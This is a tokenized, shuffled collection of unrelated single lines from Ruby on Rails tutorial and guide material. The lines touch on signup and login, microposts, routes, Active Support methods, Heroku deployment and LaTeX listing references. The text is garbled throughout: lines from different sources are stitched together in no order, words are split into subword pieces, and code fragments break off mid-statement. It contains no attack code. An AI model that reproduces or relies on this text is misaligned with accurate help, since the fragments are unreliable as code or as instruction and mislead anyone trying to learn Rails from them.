▁We ' ve ▁covered ▁a ▁lot ▁of ▁ gr ound ▁in ▁the ▁last ▁two ▁chapter s , ▁ transform ing ▁our ▁pro mis ing ▁but ▁un form ed ▁application ▁into ▁a ▁site ▁cap able ▁of ▁the ▁full ▁suite ▁of ▁signup ▁and ▁login ▁behavior s .
▁ ╼ ▁# ╼
▁=> ▁" U S ER @ E X A M P LE ▖ C O M "
▁Some ▁methods ▁will ▁trigger ▁validations , ▁but ▁some ▁will ▁not ▖
▁t ▖ integer ▁: assembly _ id
▁Ou r ▁first ▁step ▁in ▁implement ing ▁following ▁users ▁is ▁to ▁construct ▁a ▁data ▁model , ▁which ▁is ▁not ▁as ▁straightforward ▁as ▁it ▁seem s .
▁Client ▖ where ( active : ▁true )▖ pluck (: id )
▁=> ▁" dude @ a b ide s ▖ org "
▁WARNING : ▁` DateTime ` ▁is ▁not ▁ aware ▁of ▁D ST ▁rules ▁and ▁so ▁some ▁of ▁these ▁methods ▁have ▁ ed ge ▁cases ▁when ▁a ▁D ST ▁change ▁is ▁going ▁on ▖
▁When ▁this ▁form ▁is ▁submitted , ▁it ▁is ▁going ▁to ▁attempt ▁to ▁perform ▁a ▁` POST ` ▁request ╼ to ▁a ▁route ▁of ▁` / articles / : article _ id / comments ` ▁within ▁the ▁engine ▖
▁in ▁Listing ~\ ref { code : home _ page _ feed _ test } .
▁The ▁method ▁` underscore ` ▁go es ▁the ▁other ▁way ▁around , ▁from ▁c a me l ▁case ▁to ▁paths :
▁email = michael %40 michael hartl ▖ com
▁beginning _ of _ hour ▁( at _ beginning _ of _ hour )
▁ Getting ▁there ▁will ▁require ▁some ▁of ▁the ▁most ▁challenging ▁Ruby ▁programming ▁so ▁far ▁in ▁this ▁tutorial , ▁so ▁ha n g ▁in ▁there ▁through ▁the ▁end ▁and ▁be ▁prepar ed ▁for ▁a ▁little ▁heav y ▁ li f ting .
▁PR IM A RY ▁ KEY ▁( id )
▁calls ▁the ▁\ k ode { stylesheet \_ link \_ tag } ▁function ▁with ▁two ▁arguments : ▁a ▁string , ▁indicat ing ▁the ▁path ▁to ▁the ▁stylesheet , ▁and ▁a ▁hash ▁with ▁two ▁elements , ▁indicat ing ▁the ▁ media ▁type ▁and ▁tell ing ▁Rails ▁to ▁use ▁the ▁\ href { https :// github ▖ com / rails / turbolinks } { turbolinks } ▁feature ▁added ▁in ▁Rails ~4▖0 .
▁#### ▁` dasherize `
▁After ▁logging ▁in , ▁we ▁can ▁check ▁if ▁the ▁user ▁has ▁been ▁remember ed ▁by ▁look ing ▁for ▁the ▁\ k ode { remember \_ token } ▁key ▁in ▁the ▁\ k ode { cookies } .
▁ SELECT ▁* ▁FROM ▁clients ▁LIMIT ▁2
▁Ou r ▁first ▁step ▁is ▁to ▁add ▁a ▁delete ▁link ▁to ▁the ▁micropost ▁partial ▁as ▁in ▁Listing ~\ ref { code : micropost _ partial } .
▁ Write ▁a ▁test ▁to ▁make ▁sure ▁that ▁the ▁ friendly ▁ forwarding ▁only ▁forward s ▁to ▁the ▁given ▁URL ▁the ▁first ▁time .
▁Signup ▁failure ▁debug ▁information .
▁ Save ▁the ▁reset ▁digest ▁to ▁the ▁database , ▁and ▁then ▁send ▁an ▁email ▁to ▁the ▁user ▁with ▁a ▁link ▁containing ▁the ▁reset ▁token ▁and ▁user ' s ▁email ▁address .
▁# ▁< b ▁type =" integer "> 2 </ b >
▁where (" created _ at ▁> ▁? ", ▁5 ▖ day s ▖ ago )
▁ Methods ▁created ▁with ▁` ( module | class ) _ eval ( ST R IN G ) ` ▁have ▁a ▁comment ▁by ▁their ▁ side ▁with ▁an ▁instance ▁of ▁the ▁generated ▁code ▖
▁A ▁controller ▁is ▁simply ▁a ▁class ▁that ▁is ▁defined ▁to ▁inherit ▁from ╼` Application Controller ` ▖╼
▁By ▁the ▁way , ▁if ▁you ▁get ▁a ▁Guard ▁error ▁complain ing ▁about ▁the ▁absence ▁of ▁a ▁\ k ode { spec / routing } ▁directory , ▁you ▁can ▁fix ▁it ▁by ▁creating ▁an ▁empty ▁one :
▁The ▁new ▁micropost ▁page ▁(\ href { http ://0▖0▖0▖0:3000/ microposts / new }{/ microposts / new }) .
▁With ▁the ▁ preview ▁code ▁as ▁in ▁Listing ~\ ref { code : account _ activation _ preview }, ▁we ▁can ▁visit ▁the ▁suggest ed ▁URLs ▁to ▁ preview ▁the ▁account ▁activation ▁email s .
▁ s ▖ html _ safe ?
▁" _ id "▖ humanize ▁# ▁=> ▁" I d "
▁unless : ▁ Proc ▖ new ▁ { ▁| a | ▁a ▖ password ▖ blank ?
▁# ▁< object >
▁render ▁ js : ▁" alert (' Hello ▁Rails ') ; "
▁as ▁show n ▁in ▁Listing ~\ ref { code : rails _ new _ sample _ app } .
▁Some ▁common ▁Unix ▁commands .
▁#### ▁ generating ▁URLs ▁with ▁named ▁routes
▁future ?
▁#### # ▁` utc `
▁| ▁| ▁30 5 ▁| ▁: use _ proxy ▁|
▁Re ce i v ing ▁E mail s
▁### ▁link _ to
▁You ▁should ▁include ▁as ▁much ▁relevant ▁information ▁as ▁possible ▁and ▁should ▁at ▁least ▁post ▁a ▁code ▁sample ▁that ▁demonstrate s ▁the ▁issue ▖
▁Active ▁Support ▁defines ▁the ▁ macro s ▁` attr _ internal _ reader `, ▁` attr _ internal _ writer `, ▁and ▁` attr _ internal _ accessor ` ▖
▁We ▁saw ▁in ▁Section ~\ ref { sec : a _ user _ tour } ▁that ▁the ▁page ▁for ▁a ▁user ▁with ▁id ~\ k ode {1} ▁has ▁URL ▁ / users /1 .
▁TIP : ▁By ▁default ▁the ▁`: id ` ▁parameter ▁doesn ' t ▁accept ▁do t s ▁- ▁this ▁is ▁because ▁the ▁do t ▁is ▁used ▁as ▁a ▁ separator ▁for ▁ formatted ▁routes ▖
▁D ur ation s ▁can ▁be ▁added ▁to ▁and ▁sub tr ac ted ▁from ▁time ▁objects :
▁By ▁ filling ▁in ▁the ▁template ▁show n ▁in ▁Listing ~\ ref { code : update _ columns }, ▁replace ▁each ▁pair ▁of ▁\ k ode { update \_ attribute } ▁calls ▁with ▁a ▁single ▁call ▁to ▁\ k ode { update \_ columns }, ▁which ▁hit s ▁the ▁database ▁only ▁once .
▁The ▁form ▁for ▁doing ▁this ▁will ▁look ▁like ▁this :
▁The ▁pattern ▁for ▁edit ing ▁user ▁information ▁close ly ▁parallel s ▁that ▁for ▁creating ▁new ▁users ▁( Chapter ~\ ref { cha : sign _ up }) .
▁m er ate }╼╼ ▁% ▁subsection ▁ mvc _ in _ action ▁( end )╼╼ ▁\ subsection { We a k ness es ▁of ▁this ▁Users ▁resource } ▁% ▁( fold )╼ ▁\ label { sec : we a k ness es _ of _ this _ users _ resource }╼╼
▁In ▁Development
▁Database ▁indices
▁xml ▖ em (" emph a size d ")
▁NOTE : ▁Defin ed ▁in ▁` active _ support / core _ ext / string / inflections ▖ rb ` .
▁Article ▖ order (' id ▁as c ')▖ merge ( Article ▖ unscope (: order ) )
▁To ▁re m ed y ▁this ▁def ec t , ▁we ' ll ▁add ▁validations ▁for ▁the ▁image ▁size ▁and ▁format , ▁both ▁on ▁the ▁server ▁and ▁on ▁the ▁client ▁( i ▖ e ▖ , ▁in ▁the ▁browser ) .
▁X :: Y ▖ local _ constant s ▁# ▁=> ▁ [: Y 1, ▁: X 1 ]
▁This ▁guide ▁cover s ▁the ▁built - in ▁Ajax / JavaScript ▁functionality ▁of ▁Rails ▁( and ╼ more ) ; ▁it ▁will ▁enable ▁you ▁to ▁create ▁rich ▁and ▁dynamic ▁Ajax ▁applications ▁with ╼ ea se !
▁| ▁| ▁40 5 ▁| ▁: method _ not _ allow ed ▁|
▁S 3 ▁is ▁a ▁pa id ▁ service , ▁but ▁the ▁ storage ▁needed ▁to ▁set ▁up ▁and ▁test ▁the ▁Rails ▁Tutorial ▁sample ▁application ▁ cost s ▁less ▁than ▁a ▁c ent ▁per ▁ month .
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁This ▁guide ▁is ▁design ed ▁for ▁beginners ▁who ▁want ▁to ▁get ▁started ▁with ▁a ▁Rails ╼ application ▁from ▁scratch ▖
▁#### # ▁`: counter _ cache `
▁The ▁test ▁itself ▁involve s ▁check ing ▁for ▁a ▁\ k ode { div } ▁with ▁the ▁required ▁\ k ode { pagination } ▁class ▁and ▁verify ing ▁that ▁the ▁first ▁page ▁of ▁users ▁is ▁present .
▁Now ▁that ▁the ▁users ▁index ▁is ▁complete , ▁there ' s ▁only ▁one ▁can on ical ▁REST ▁action ▁left : ▁\ k ode { destroy } .
▁Before ▁running ▁Spork , ▁we ▁can ▁get ▁a ▁base line ▁for ▁the ▁testing ▁over head ▁by ▁t im ing ▁our ▁test ▁suite ▁as ▁follows :
▁Then ▁push ▁up ▁the ▁remote ▁repository ▁and ▁the ▁production ▁server :
▁There ▁are ▁cases ▁where ▁you ▁need ▁to ▁define ▁a ▁method ▁with ▁` define _ method `, ▁but ▁don ' t ▁know ▁whether ▁a ▁method ▁with ▁that ▁name ▁already ▁exists ▖
▁We ▁first ▁covered ▁ ERb ▁in ▁Section ~\ ref { sec : embedded _ ruby }, ▁and ▁cover ▁Sass ▁in ▁Section ~\ ref { sec : sass } .
▁We ▁next ▁write ▁a ▁short ▁test ▁to ▁make ▁sure ▁one ▁user ▁can ' t ▁delete ▁the ▁microposts ▁of ▁a ▁different ▁user , ▁and ▁we ▁also ▁check ▁for ▁the ▁proper ▁redirect , ▁as ▁seen ▁in ▁Listing ~\ ref { code : micropost _ user _ mis match _ test } .
▁ ╼ ▁=> ▁1
▁The ▁steps ▁are ▁simple ▁if ▁some what ▁mysterious .
▁N ever the less , ▁Cucumber ▁does ▁have ▁a ▁place ▁in ▁the ▁Ruby ▁testing ▁tool k it , ▁and ▁I ▁es pecially ▁like ▁its ▁emphasi s ▁on ▁high - level ▁behavior ▁over ▁ low - level ▁implementation .
▁Otherwise , ▁all ▁ autoload ing ▁happens ▁only ▁once ▖
▁This ▁check s ▁for ▁an ▁\ k ode { img } ▁tag ▁with ▁class ▁\ k ode { gravatar } ▁\ emph { in side } ▁a ▁to p - level ▁ head ing ▁tag ▁(\ k ode { h 1 }) .
▁# ▁=> ▁We d , ▁ 08 ▁Jun ▁2011 ▁01 : 5 6 : 22 ▁- 06 00
▁gem ▁' sass - rails '
▁The ▁result ▁is ▁the ▁user ▁\ href { http ://0▖0▖0▖0:3000/ users /1 }{\ text tt { show } } ▁page , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : demo _ show _ user _ rails _3} .
▁( We ▁could ▁eliminate ▁some ▁duplication ▁by ▁ putting ▁the ▁test ▁login ▁in ▁the ▁\ k ode { setup } ▁method ▁of ▁Listing ~\ ref { code : edit _ tests _ logged _ in }, ▁but ▁in ▁Section ~\ ref { sec : friendly _ forwarding } ▁we ' ll ▁change ▁one ▁of ▁the ▁tests ▁to ▁visit ▁the ▁edit ▁page ▁\ emph { before } ▁logging ▁in , ▁which ▁isn ' t ▁possible ▁if ▁the ▁login ▁step ▁happens ▁during ▁the ▁test ▁setup ▖)
▁The ▁action ▁defined ▁in ▁this ▁method ▁is ▁also ▁ reversible ,╼ which ▁means ▁Rails ▁know s ▁how ▁to ▁ reverse ▁the ▁change ▁made ▁by ▁this ▁migration ,╼ in ▁case ▁you ▁want ▁to ▁ reverse ▁it ▁later ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : sign _ out _ with _ forget } .
▁A long ▁with ▁this , ▁controllers , ▁models ╼ and ▁table ▁names ▁are ▁also ▁namespaced ▖
▁use ▁ ActionDispatch :: Request I d
▁ Adding ▁microposts ▁to ▁the ▁sample ▁data .
▁In ▁versions ▁of ▁Rails ▁before ▁ 3▖0 ▁( including ▁ 3▖0 ▁itself ), ▁static ▁assets ▁live d ▁in ▁the ▁\ k ode { public / } ▁directory , ▁as ▁follows :
▁# ▁it ▁will ▁be ▁possible ▁to ▁create ▁the ▁record ▁with ▁a ▁non - numeric al ▁ age
▁ Technical ly , ▁Rails ▁uses ▁the ▁\ k ode { underscore } ▁method ▁to ▁convert ▁the ▁class ▁name ▁to ▁an ▁id .
▁12345678▖ to _ s (: delimited , ▁ delimiter : ▁ "," ) ▁# ▁=> ▁12,345,678
▁* ▁` javascript _ engine ` ▁configure s ▁the ▁engine ▁to ▁be ▁used ▁( for ▁ eg ▖ ▁ coffee ) ▁when ▁ generating ▁assets ▖
▁The ▁ MIT ▁L ic en se
▁Convert ╼ to ▁an ▁` Array ` ▁by ▁calling ▁` # to _ a ` ▁before ▁using ▁these ▁methods .
▁To ▁see ▁your ▁new ly ▁deploy ed ▁application , ▁visit ▁the ▁address ▁that ▁you ▁saw ▁when ▁you ▁ r an ▁\ k ode { heroku ▁create } ▁( i ▖ e ▖ , ▁Listing ~\ ref { code : heroku _ create }) .
▁The ▁structure ▁of ▁this ▁section ▁is ▁base d ▁on ▁the ▁excellent ▁blog ▁post ▁`` The ▁Rails ▁3 ▁ Asset ▁Pipeline ▁in ▁( about ) ▁5 ▁M in ute s '' ▁by ▁ Michael ▁E ra s m us .
▁3 ▖ 5 ▖ g ig abytes ▁# ▁=> ▁ 37 5 80 9 6 38 4
▁To ▁facilit ate ▁the ▁use ▁of ▁these ▁parameters , ▁it ' s ▁convention al ▁to ▁introduce ▁an ▁aux i li ary ▁method ▁called ▁\ k ode { user \_ params } ▁( which ▁returns ▁an ▁appropriate ▁initialization ▁hash ) ▁and ▁use ▁it ▁in ▁place ▁of ▁\ k ode { params [: user ]} :
▁First , ▁take ▁a ▁look ▁at ▁` app / models / comment ▖ rb `:
▁delete ▁micropost ▁with ▁id ▁\ k ode {1}
▁Next ▁we ▁have ▁to ▁create ▁and ▁configure ▁a ▁new ▁Heroku ▁account .
▁NOTE : ▁All ▁the ▁following ▁methods ▁are ▁defined ▁in ▁` active _ support / core _ ext / time / calculations ▖ rb ` .
▁# ▁find ▁all ▁users ▁named ▁ David ▁who ▁are ▁Code ▁Artist s ▁and ▁sort ▁by ▁created _ at ▁in ▁ reverse ▁ ch r on o logical ▁order
▁Git ▁has ▁a ▁simple ▁ mechanism ▁to ▁ignore ▁such ▁files : ▁simply ▁include ▁a ▁file ▁called ▁\ k ode { ▖ gitignore } ▁in ▁the ▁application ▁root ▁directory ▁with ▁some ▁rules ▁tell ing ▁Git ▁which ▁files ▁to ▁ignore
▁create ▁app / views / microposts / show ▖ json ▖ jbuilder
▁Fri , ▁31 ▁De c ▁2010 ▁ 23:59:59 ▁UTC ▁+00:00
▁### ▁config / application ▖ rb
▁use ▁Rack :: Lock
▁\ emph { Hint } : ▁Use ▁\ k ode { user ▖ reload } ▁to ▁retrieve ▁the ▁new ▁value ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 140 f 50 ' ></ span >╼╼ \ end { enumerate } ╼╼% ▁subsection ▁updating _ the _ reset ▁( end )╼╼ \ subsection { Password ▁reset ▁test } ▁% ▁( fold )╼\ label { sec : password _ reset _ test }╼╼
▁X 2 ▁= ▁2
▁| lib / | E x t end ed ▁module s ▁for ▁your ▁application .
▁This ▁introduce s ▁the ▁Sass ▁\ emph { mixin } ▁facilit y , ▁in ▁this ▁case ▁called ▁\ k ode { box \_ sizing } .
▁An y ▁commands ▁p ref ac ed ▁with ▁a ╼ do ll ar ▁sign ▁` $ ` ▁should ▁be ▁run ▁in ▁the ▁command ▁line ▖
▁The ▁methods ▁` to _ date `, ▁` to _ time `, ▁and ▁` to _ datetime ` ▁are ▁basic ally ▁convenience ▁wrap p ers ▁around ▁` Date ▖ _ parse `:
▁No ▁automatic ▁user / micropost ▁association
▁# ▁Run ▁ spec s ▁in ▁random ▁order ▁to ▁ s ur fa ce ▁order ▁ dependencies .
▁So ▁far , ▁the ▁Sessions ▁controller ▁actions ▁have ▁followed ▁the ▁RESTful ▁convention ▁of ▁using ▁\ k ode { new } ▁for ▁a ▁signin ▁page ▁and ▁\ k ode { create } ▁to ▁complete ▁the ▁signin .
▁S ince ▁we ▁included ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁the ▁routes ▁file ▁already ▁has ▁a ▁rule ▁for ▁each ▁one , ▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes } .
▁has _ many ▁: comments , ▁-> ▁ { ▁order (' post ed _ at ▁DESC ') ▁ }
▁A ▁mockup ▁of ▁the ▁Home ▁page ▁with ▁a ▁ proto - feed .
▁The ▁block ▁argument ▁of ▁the ▁` initializer ` ▁method ▁is ▁the ▁instance ▁of ▁the ▁application ▁itself , ▁and ▁so ▁we ▁can ▁access ▁the ▁configuration ▁on ▁it ▁by ▁using ▁the ▁` config ` ▁method ▁as ▁done ▁in ▁the ▁example .
▁NOTE : ▁Under ▁normal ▁c irc um st ance s ▁the ▁default ▁` config ▖ assets ▖ digest ` ▁option ╼ should ▁not ▁be ▁changed ▖
▁Here ' s ▁an ▁example :
▁If ▁this ▁image ▁is ╼ already ▁available ▁in ▁` public / assets ` ▁as ▁a ▁fingerprint ed ▁file , ▁then ▁that ▁path ▁is ╼ ref er ence d .
▁ puts ▁" C all ed "
▁< p > <%= ▁text _ field _ tag ▁' name ' ▁%></ p >
▁Using ▁Action ▁Mailer ▁ Helpers
▁S ince ▁it ' s ▁just ▁a ▁`< form >` , ▁all ▁of ▁the ▁information ▁on ▁` form _ for ` ▁also ▁applies .
▁To ▁run ▁the ▁features , ▁we ▁use ▁the ▁\ k ode { cucumber } ▁execut able :
▁You ▁will ▁also ▁have ▁to ▁learn ▁about ▁the ▁\ k ode { config / database ▖ yml } ▁file ▁and ▁how ▁to ▁run ▁PostgreSQL ▁local ly .
▁A ▁form ▁for ▁un following ▁a ▁user ▁using ▁Ajax .
▁Option ally ▁requires ▁` active _ support / all ` ▁if ▁` config ▖ active _ support ▖ bar e ` ▁is ▁un - t ru th ful , ▁which ▁is ▁the ▁default .
▁The ▁feed ▁for ▁a ▁user ▁( id ▁1) ▁following ▁users ▁with ▁id s ▁2, ▁7 , ▁ 8, ▁and ▁10 .
▁* ▁Rails ▁4▖0 ▁has ▁removed ▁the ▁id entity ▁map ▁from ▁Active ▁Record , ▁due ▁to ▁[ some ▁in con s ist en c ies ▁with ▁associations ]( https :// github ▖ com / rails / rails / commit / 302 c 9 12 b f 6 b cd 0 fa 200 d 9 64 ec 2 d c 4 a 44 a be 3 28 a 6 )▖ ▁If ▁you ▁have ▁manually ▁enabled ▁it ▁in ▁your ▁application , ▁you ▁will ▁have ▁to ▁remove ▁the ▁following ▁config ▁that ▁has ▁no ▁effect ▁any more : ▁` config ▖ active _ record ▖ id entity _ map ` .
▁( The ▁first ▁line ▁here ▁is ▁just ▁to ▁make ▁sure ▁that ▁you ▁start ▁on ▁the ▁master ▁branch , ▁so ▁that ▁the ▁\ k ode { static - pages } ▁topic ▁branch ▁is ▁base d ▁on ▁\ k ode { master } .
▁ Copy ▁your ▁\ href { https :// en ▖ w ikipedia ▖ org / wiki / P ub li c - key _ crypt o gr a ph y }{\ emph { public ▁key } } ▁to ▁your ▁c li p board .
▁$ ▁rails ▁console ▁test
▁To ▁change ▁a ▁user ' s ▁information , ▁we ▁visit ▁the ▁\ href { http :// localhost :3000/ users /1/ edit }{\ text tt { edit } } ▁page ▁( Figure ~\ ref { fig : demo _ edit _ user _ rails _3} ) .
▁By ▁default , ▁Rails ▁links ▁to ▁these ▁assets ▁on ▁the ▁current ▁host ▁in ▁the ▁public ▁folder , ▁but ▁you ▁can ▁direct ▁Rails ▁to ▁link ▁to ▁assets ▁from ▁a ▁d ed icated ▁assets ▁server ▁by ▁setting ▁` config ▖ action _ controller ▖ asset _ host ` ▁in ▁the ▁application ▁configuration , ▁typical ly ▁in ▁` config / environments / production ▖ rb ` ▖
▁The ▁\ k ode { update } ▁action ▁needed ▁to ▁get ▁the ▁tests ▁in ▁Listing ~\ ref { code : user _ update _ spec s } ▁to ▁pass ▁is ▁similar ▁to ▁the ▁final ▁form ▁of ▁the ▁\ k ode { create } ▁action ▁( Listing ~\ ref { code : signin _ upon _ signup }), ▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ update _ action } .
▁At ▁this ▁point , ▁we ▁can ▁get ▁a ▁look ▁at ▁our ▁updated ▁user ▁profile ▁page ▁in ▁Figure ~\ ref { fig : user _ profile _ no _ microposts } .
▁Sass ▁allows ▁us ▁to ▁define ▁\ emph { variable s } ▁to ▁eliminate ▁duplication ▁and ▁write ▁more ▁express ive ▁code .
▁#### # ▁`: source _ type `
▁Testing ▁that ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁require ▁the ▁right ▁user .
▁M ig r ate ▁a way ▁from ▁ MultiJSON ▁by ▁using ▁` ob j ▖ to _ json `, ▁and ▁` JSON ▖ parse ( str ) ` ▁instead .
▁ Y es , ▁you ▁can ▁see ▁the ╼ parameters ▁but ▁not h ing ▁in ▁particular ▁is ▁being ▁done ▁with ▁them .
▁The ▁opt im al ▁method ▁really ▁depend s ▁on ▁your ▁needs ; ▁if ▁you ▁expect ▁a ▁\ emph { large } ▁number ▁of ▁static ▁pages , ▁using ▁a ▁StaticPages ▁controller ▁can ▁get ▁quite ▁cumbersome , ▁but ▁in ▁our ▁sample ▁app ▁we ' ll ▁only ▁need ▁a ▁few .
▁Create d ▁ http :// st or my - cloud - 5 88 1 ▖ heroku app ▖ com / ▁|
▁The ▁migration ▁add s ▁the ▁\ k ode { admin } ▁column ▁to ▁the ▁\ k ode { users } ▁table , ▁as ▁show n ▁in ▁Listing ~\ ref { code : admin _ migration } .
▁client ▁= ▁Client ▖ find ( [ 1, ▁10 ]) ▁# ▁Or ▁even ▁Client ▖ find ( 1, ▁10 )
▁By ▁default , ▁in ▁a ▁\ k ode { has \_ many ▁through } ▁association ▁Rails ▁look s ▁for ▁a ▁foreign ▁key ▁corresponding ▁to ▁the ▁ singular ▁version ▁of ▁the ▁association ; ▁in ▁other ▁words , ▁code ▁like
▁has _ many ▁: orders ▁do
▁Active ▁Support ▁extend s ▁these ▁methods ▁so ▁that ▁the ▁argument ▁may ▁be ▁another ▁ range ▁in ▁turn ▖
▁#### ▁Rendering ▁an ▁A rb it r ary ▁File
▁in ▁Listing ~\ ref { code : header _ partial } ▁and
▁In clu d ing ▁the ▁specific ▁address ▁that ▁cause s ▁any ▁failure ▁is ▁es pecially ▁useful ▁in ▁a ▁test ▁with ▁an ▁\ k ode { each } ▁ lo o p ▁like ▁Listing ~\ ref { code : email _ format _ valid _ tests } ; ▁otherwise , ▁any ▁failure ▁would ▁me re ly ▁identify ▁the ▁line ▁number , ▁which ▁is ▁the ▁same ▁for ▁all ▁the ▁email ▁addresses , ▁and ▁which ▁would n ' t ▁be ▁ sufficient ▁to ▁identify ▁the ▁source ▁of ▁the ▁problem .
▁ nick ▖ p ers ist ed ?
▁( Rails ▁infer s ▁that ▁\ k ode { uniqueness } ▁should ▁be ▁\ k ode { true } ▁as ▁well ▖)
▁* ▁` auto play : ▁true `, ▁start s ▁ play ing ▁the ▁ audio ▁on ▁page ▁load
▁As ▁noted ▁in ▁Section ~\ ref { sec : strong _ parameters }, ▁this ▁is ▁accomplish ed ▁using ▁\ emph { strong ▁parameters } ▁by ▁calling ▁\ k ode { require } ▁and ▁\ k ode { permit } ▁on ▁the ▁\ k ode { params } ▁hash :
▁has _ many ▁: customers , ▁ dependent : ▁: destroy
▁Check ▁out ▁the ▁section ▁about ▁ cross - site ▁ script ing ▁in ▁the ▁[ Security ▁guide ]( security ▖ html # cross - site - script ing - x s s ) ▁for ▁further ▁information ▁about ▁the ▁risk s .
▁T ra d it ion al ▁methods ▁for ▁ org an i z ing ▁CSS ▁and ▁JavaScript ▁involve ▁ split ting ▁functionality ▁into ▁separate ▁files ▁and ▁using ▁nice ▁format ting ▁( with ▁lot s ▁of ▁indentation ) .
▁Find ing ▁and ▁ authenticating ▁a ▁user .
▁now ▁- ▁1▖ week
▁ Adding ▁a ▁micropost ▁instance ▁variable ▁to ▁the ▁\ k ode { home } ▁action .
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides ▖ rubyonrails ▖ org / v 3 ▖ 1▖23 / active _ record _ validations _ callback s ▖ html } { d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁Guides } .
▁Consider ▁the ▁following ▁ lo o p ▁for ▁names :
▁<%= ▁render ▁partial : ▁" product " ▁%>
▁Now ▁that ▁we ' ve ▁supplied ▁the ▁User ▁model ▁with ▁the ▁required ▁\ k ode { password \_ digest } ▁attribute ▁and ▁installed ▁ bcrypt , ▁we ' re ▁ready ▁to ▁add ▁\ k ode { has \_ secure \_ password } ▁to ▁the ▁User ▁model , ▁as ▁show n ▁in ▁Listing ~\ ref { code : has _ secure _ password } .
▁ '' ▁T hanks ▁to ▁reader ▁R ile y ▁ Mo s es ▁for ▁point ing ▁this ▁out .
▁( This ▁ assumes ▁you ▁created ▁the ▁Heroku ▁app ▁in ▁Section ~\ ref { sec : planning _ the _ application } .
▁This ▁is ▁one ▁reason ▁why ▁ having ▁a ▁good ▁test ▁suite ▁is ▁so ▁ val u able .
▁Implement ▁a ▁search ▁feature ▁to ▁re m ed y ▁this .
▁On ▁some ▁systems , ▁you ▁may ▁need ▁to ▁restart ▁the ▁Rails ▁server ▁at ▁this ▁point ▁to ▁keep ▁the ▁test ▁suite ▁\ passing .
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory .
▁Extensions ▁to ▁` Marshal `
▁### ▁Path ▁and ▁URL ▁ Helpers
▁Git ▁is ▁in c r ed i b ly ▁good ▁at ▁making ▁\ emph { branch es }, ▁which ▁are ▁effective ly ▁copie s ▁of ▁a ▁repository ▁where ▁we ▁can ▁make ▁( possibl y ▁ ex pe ri ment al ) ▁changes ▁without ▁modify ing ▁the ▁ parent ▁files .
▁Doe s ▁the ▁same ▁as ▁` create _ association ` ▁above , ▁but ▁raise s ▁` ActiveRecord :: RecordInvalid ` ▁if ▁the ▁record ▁is ▁invalid .
▁### ▁P ref i x ing ▁the ▁Name d ▁Route ▁ Helpers
▁### ▁` unscope `
▁Ruby ▁versions ▁1▖9 ▁and ▁later ▁actually ▁guarantee ▁that ▁hashes ▁keep ▁their ▁elements ▁in ▁the ▁same ▁order ▁entered , ▁but ▁it ▁would ▁be ▁un w is e ▁ever ▁to ▁count ▁on ▁a ▁particular ▁ ordering .
▁This ▁gem ▁uses ▁Ajax ▁to ▁ speed ▁up ▁page ▁rendering ▁in ▁most ▁applications .
▁S ince ▁the ▁ encrypted ▁\ k ode { S ec ure R an dom ▖ url safe \_ base 64 } ▁string ▁is ▁defin ite ly ▁\ emph { not } ▁blank , ▁the ▁tests ▁for ▁the ▁User ▁model ▁should ▁now ▁be ▁passing :
▁#### # ▁` collection ▖ destroy ( object , ▁ ▖▖▖)
▁S ince ▁we ' ll ▁be ▁testing ▁password ▁ mis match ▁in ▁a ▁moment , ▁here ▁we ▁make ▁sure ▁to ▁test ▁the ▁\ emph { presence } ▁validation ▁by ▁setting ▁both ▁the ▁password ▁and ▁its ▁confirmation ▁to ▁a ▁blank ▁string .
▁For ▁` belongs _ to ` ▁associations ▁you ▁need ▁to ▁create ▁foreign ▁keys , ▁and ▁for ▁` has _ and _ belongs _ to _ many ` ▁associations ▁you ▁need ▁to ▁create ▁the ▁appropriate ▁join ▁table .
▁Now , ▁Active ▁Model ▁ Seri al ize rs ▁and ▁Active ▁Record ▁objects ▁have ▁the ▁same ▁default ▁behavior ▖
▁With ▁Active ▁Job ▁you ▁can ▁ s ch ed ul e ╼ the ▁job ▁to ▁run ▁on ▁a ▁specific ▁ queue :
▁With ▁a ▁random ▁ subdomain ▁like ▁this , ▁some one ▁could ▁visit ▁your ▁site ▁only ▁if ▁you ▁g a ve ▁them ▁the ▁address .
▁* ▁` config ▖ action _ controller ▖ action _ on _ un permitted _ parameters ` ▁enable s ▁logging ▁or ▁ ra is ing ▁an ▁exception ▁if ▁parameters ▁that ▁are ▁not ▁explicitly ▁ permitted ▁are ▁found ▖
▁The ▁result ing ▁Home ▁page ▁appears ▁in ▁Figure ~\ ref { fig : home _ page _ follow _ stats } .
▁See ▁its ▁documentation ▁for ▁full ╼ de tail s .
▁The ▁initial ▁index ▁page ▁for ▁the ▁Users ▁resource ▁(\ href { http :// localhost :3000/ users }{/ users }) .
▁Because ▁its ▁meaning ▁is ▁a ▁little ▁clear er , ▁we ' ll ▁prefer ▁this ▁second ▁compar is on ▁form ▁in ▁the ▁application ▁code .
▁We ▁deploy ed ▁our ▁application ▁to ▁a ▁production ▁environment ▁using ▁Heroku .
▁As ▁it ▁present ly ▁stand s , ▁the ▁sample ▁application ▁forms ▁a ▁so li d ▁foundation ▁for ▁any ▁website ▁ requiring ▁users ▁with ▁authentication ▁and ▁ authorization .
▁Because ▁the ▁message ▁is ▁also ▁inserted ▁into ▁the ▁template , ▁the ▁full ▁HTML ▁result ▁for
▁resources ▁: photos , ▁except : ▁: destroy
▁create _ table ▁: employee s ▁do ▁| t |
▁class ▁C
▁Fix ing ▁this ▁blemish ▁is ▁the ▁task ▁of ▁Section ~\ ref { sec : a _ flash _ test } .
▁The ▁actual ▁HTML ▁generated ▁by ▁this ▁ ERb ▁isn ' t ▁particular ly ▁relevant , ▁but ▁you ▁m ight ▁be ▁curious , ▁so ▁here ' s ▁a ▁ pe e k :
▁ Comm on ▁Validation ▁ Options
▁The ▁full ▁implementation ▁appears ▁in ▁Listing ~\ ref { code : relationships _ controller } .
▁< h 1> Book s ▁are ▁ com ing ▁soon !
